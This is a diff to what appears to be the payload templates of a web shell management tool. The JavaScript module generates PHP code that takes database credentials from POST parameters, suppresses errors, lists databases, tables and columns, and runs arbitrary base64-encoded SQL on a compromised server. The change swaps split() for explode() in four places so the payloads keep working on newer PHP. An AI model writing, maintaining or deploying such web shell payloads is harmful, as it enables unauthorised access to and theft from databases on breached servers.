@@ -10,8 +10,8 @@ module.exports = (arg1, arg2, arg3, arg4, arg5, arg6) => ({
       $hst=$m?stripslashes($_POST["${arg1}"]):$_POST["${arg1}"];
       $usr=$m?stripslashes($_POST["${arg2}"]):$_POST["${arg2}"];
       $pwd=$m?stripslashes($_POST["${arg3}"]):$_POST["${arg3}"];
-      $port=split(":",$hst)[1];
-      $hst=split(":",$hst)[0];
+      $port=explode(":",$hst)[1];
+      $hst=explode(":",$hst)[0];
       $T=@mysqli_connect($hst,$usr,$pwd,"",$port);
       $q=@mysqli_query($T,"SHOW DATABASES");
       while($rs=@mysqli_fetch_row($q)){
@@ -29,8 +29,8 @@ module.exports = (arg1, arg2, arg3, arg4, arg5, arg6) => ({
       $usr=$m?stripslashes($_POST["${arg2}"]):$_POST["${arg2}"];
       $pwd=$m?stripslashes($_POST["${arg3}"]):$_POST["${arg3}"];
       $dbn=$m?stripslashes($_POST["${arg4}"]):$_POST["${arg4}"];
-      $port=split(":",$hst)[1];
-      $hst=split(":",$hst)[0];
+      $port=explode(":",$hst)[1];
+      $hst=explode(":",$hst)[0];
       $T=@mysqli_connect($hst,$usr,$pwd,"",$port);
       $q=@mysqli_query($T, "SHOW TABLES FROM \`{$dbn}\`");
       while($rs=@mysqli_fetch_row($q)){
@@ -50,8 +50,8 @@ module.exports = (arg1, arg2, arg3, arg4, arg5, arg6) => ({
       $pwd=$m?stripslashes($_POST["${arg3}"]):$_POST["${arg3}"];
       $dbn=$m?stripslashes($_POST["${arg4}"]):$_POST["${arg4}"];
       $tab=$m?stripslashes($_POST["${arg5}"]):$_POST["${arg5}"];
-      $port=split(":",$hst)[1];
-      $hst=split(":",$hst)[0];
+      $port=explode(":",$hst)[1];
+      $hst=explode(":",$hst)[0];
       $T=@mysqli_connect($hst,$usr,$pwd,"",$port);
       @mysqli_select_db($T, $dbn);
       $q=@mysqli_query($T, "SHOW COLUMNS FROM \`{$tab}\`");
@@ -73,8 +73,8 @@ module.exports = (arg1, arg2, arg3, arg4, arg5, arg6) => ({
       $pwd=$m?stripslashes($_POST["${arg3}"]):$_POST["${arg3}"];
       $dbn=$m?stripslashes($_POST["${arg4}"]):$_POST["${arg4}"];
       $sql=base64_decode($_POST["${arg5}"]);
-      $port=split(":",$hst)[1];
-      $hst=split(":",$hst)[0];
+      $port=explode(":",$hst)[1];
+      $hst=explode(":",$hst)[0];
       $T=@mysqli_connect($hst,$usr,$pwd,"",$port);
       @mysqli_query($T,"SET NAMES $_POST[${arg6}]");
       @mysqli_select_db($T,$dbn);
